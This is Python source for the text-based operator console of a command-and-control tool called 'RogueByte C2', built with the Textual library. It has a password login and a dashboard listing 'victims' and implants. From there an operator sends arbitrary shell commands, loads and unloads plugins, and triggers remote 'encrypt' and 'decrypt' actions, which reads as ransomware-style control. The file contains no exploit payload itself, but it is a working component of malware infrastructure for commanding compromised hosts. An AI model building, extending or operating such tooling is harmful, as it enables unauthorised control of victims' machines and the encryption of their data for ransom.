import threading
import datetime

from textual.app import App, ComposeResult
from textual.screen import Screen
from textual.containers import Horizontal, Vertical
from textual.widgets import Header, Footer, Input, Button, Label, TabbedContent, TabPane

from cli.client import C2Client
from cli.widgets import (
    HeaderWidget, VictimListWidget, DetailPanel, CommandLogWidget,
    InputBar, PluginsPanelWidget, AlertsPanelWidget,
)


class LoginScreen(Screen):
    def __init__(self, client):
        super().__init__()
        self.client = client

    def compose(self) -> ComposeResult:
        yield Vertical(
            Label('[bold #00d4ff]ROGUEBYTE C2[/] [#ffd700]v0.1.9-Beta[/]', id='login-title'),
            Label(id='login-prompt'),
            Input(placeholder='Password', password=True, id='password-input'),
            Label(id='login-error'),
            id='login-container',
        )

    def on_mount(self):
        if self.client.needs_setup:
            self.query_one('#login-prompt', Label).update(
                '[#ffd700]Set initial password:[/]'
            )
        else:
            self.query_one('#login-prompt', Label).update(
                '[#ffd700]Enter password to unlock:[/]'
            )
        self.query_one('#password-input', Input).focus()

    def on_input_submitted(self, event: Input.Submitted):
        if event.input.id != 'password-input':
            return
        pw = event.value.strip()
        if len(pw) < 4:
            self.query_one('#login-error', Label).update(
                '[#ff6b6b]Password must be at least 4 characters[/]'
            )
            return
        success = self.client.setup(pw) if self.client.needs_setup else self.client.login(pw)
        if success:
            self.app.pop_screen()
            self.app.push_screen('dashboard')
        else:
            msg = 'Setup failed' if self.client.needs_setup else 'Invalid password'
            self.query_one('#login-error', Label).update(f'[#ff6b6b]{msg}[/]')


class DashboardScreen(Screen):
    BINDINGS = [
        ('f5', 'action_encrypt', 'Encrypt'),
        ('f6', 'action_decrypt', 'Decrypt'),
        ('f7', 'action_exec', 'Exec'),
        ('l', 'action_load_plugin', 'Load Plugin'),
        ('u', 'action_unload_plugin', 'Unload Plugin'),
        ('q', 'app.quit', 'Quit'),
    ]

    def __init__(self, client):
        super().__init__()
        self.client = client

    def compose(self) -> ComposeResult:
        yield HeaderWidget(self.client)
        with TabbedContent(initial='implants'):
            with TabPane('[#00d4ff]Implants[/]', id='implants'):
                with Horizontal(id='implants-layout'):
                    yield VictimListWidget(self.client)
                    with Vertical(id='detail-area'):
                        yield DetailPanel(self.client)
                        yield CommandLogWidget(self.client)
            with TabPane('[#b388ff]Plugins[/]', id='plugins'):
                yield PluginsPanelWidget(self.client)
            with TabPane('[#ff9100]Alerts[/]', id='alerts'):
                yield AlertsPanelWidget(self.client)
        yield InputBar(self.client)

    def on_mount(self):
        self.client.on_update = self._handle_event
        self._refresh_all()
        if not self.client.connected:
            threading.Thread(target=self.client.connect, daemon=True).start()

    def _handle_event(self, event, *args):
        self.app.call_from_thread(self._refresh_all)

    def _refresh_all(self):
        for w in self.query(HeaderWidget):
            w.refresh_content()
        for w in self.query(VictimListWidget):
            w.refresh_content()
        for w in self.query(DetailPanel):
            w.refresh_content()
        for w in self.query(CommandLogWidget):
            w.refresh_content()
        for w in self.query(PluginsPanelWidget):
            w.refresh_content()
        for w in self.query(AlertsPanelWidget):
            w.refresh_content()

    def on_input_submitted(self, event: Input.Submitted):
        text = event.value.strip()
        if not text or event.input.id == 'password-input':
            return
        event.input.clear()
        hostname = self.client.selected_hostname
        parts = text.split(maxsplit=1)
        cmd = parts[0].lower() if parts else ''
        arg = parts[1] if len(parts) > 1 else ''

        if cmd == 'help':
            self._log('Commands: exec <cmd>, l <plugin>, u <plugin>, plugins, alerts, q')
        elif cmd == 'exit' or cmd == 'q':
            self.app.quit()
        elif cmd == 'plugins':
            self.client.fetch_plugins()
            for w in self.query(PluginsPanelWidget):
                w.refresh_content()
        elif cmd == 'alerts':
            self.client.fetch_alert_rules()
            self.client.fetch_alert_log()
            for w in self.query(AlertsPanelWidget):
                w.refresh_content()
        elif cmd == 'l' and arg:
            if hostname:
                self.client.send_command(hostname, 'load_plugin', {'plugin_name': arg})
                self._log(f'load_plugin {arg} → {hostname}')
            else:
                self._log('[#ff6b6b]No victim selected[/]')
        elif cmd == 'u' and arg:
            if hostname:
                self.client.send_command(hostname, 'unload_plugin', {'plugin_name': arg})
                self._log(f'unload_plugin {arg} → {hostname}')
            else:
                self._log('[#ff6b6b]No victim selected[/]')
        elif cmd == 'exec' and arg:
            if hostname:
                self.client.send_command(hostname, 'exec', {'cmd': arg})
                self._log(f'exec → {hostname}: {arg}')
            else:
                self._log('[#ff6b6b]No victim selected[/]')
        else:
            if hostname:
                self.client.send_command(hostname, 'exec', {'cmd': text})
                self._log(f'exec → {hostname}: {text}')
            else:
                self._log('[#ff6b6b]No victim selected[/]')

        for w in self.query(CommandLogWidget):
            w.refresh_content()

    def action_encrypt(self):
        hostname = self.client.selected_hostname
        if hostname:
            self.client.send_command(hostname, 'encrypt', {})
            self._log(f'encrypt → {hostname}')

    def action_decrypt(self):
        hostname = self.client.selected_hostname
        if hostname:
            self.client.send_command(hostname, 'decrypt', {})
            self._log(f'decrypt → {hostname}')

    def action_exec(self):
        hostname = self.client.selected_hostname
        if hostname:
            ib = self.query_one(InputBar)
            ib.focus()
            ib.value = 'exec '

    def action_load_plugin(self):
        hostname = self.client.selected_hostname
        if hostname:
            ib = self.query_one(InputBar)
            ib.focus()
            ib.value = 'l '

    def action_unload_plugin(self):
        hostname = self.client.selected_hostname
        if hostname:
            ib = self.query_one(InputBar)
            ib.focus()
            ib.value = 'u '

    def _log(self, msg):
        from datetime import datetime as dt
        cl = self.query_one(CommandLogWidget)
        now = dt.now().strftime('%H:%M:%S')
        cl.write(f'[#6e7681]{now}[/] {msg}')
        cl.scroll_end()


class C2App(App):
    CSS = '''
    Screen {
        background: #0d1117;
    }
    TabbedContent {
        height: 1fr;
    }
    #implants-layout {
        height: 1fr;
    }
    VictimListWidget {
        width: 30;
        min-width: 24;
        border: solid #2d2d3d;
        height: 1fr;
    }
    #detail-area {
        width: 1fr;
        height: 1fr;
    }
    DetailPanel {
        height: 14;
        border: solid #2d2d3d;
        margin: 0 0 1 0;
    }
    CommandLogWidget {
        height: 1fr;
        border: solid #2d2d3d;
    }
    PluginsPanelWidget {
        height: 1fr;
        border: solid #2d2d3d;
    }
    AlertsPanelWidget {
        height: 1fr;
        border: solid #2d2d3d;
    }
    InputBar {
        dock: bottom;
        height: 3;
    }
    HeaderWidget {
        background: #161b22;
        color: #e6edf3;
        height: 1;
        padding: 0 1;
    }
    #login-container {
        align: center middle;
        width: 40;
        height: auto;
    }
    #login-title {
        text-align: center;
        padding: 1 0 0 0;
    }
    #login-prompt {
        text-align: center;
        padding: 1 0;
    }
    #login-error {
        text-align: center;
        padding: 1 0;
    }
    #password-input {
        margin: 0 4;
    }
    TabPane {
        padding: 0;
    }
    '''

    def __init__(self, client):
        super().__init__()
        self.client = client

    def on_mount(self):
        self.title = 'RogueByte C2'
        self.sub_title = 'v0.1.9-Beta'
        if self.client.locked:
            self.push_screen(LoginScreen(self.client))
        else:
            self.push_screen(DashboardScreen(self.client))
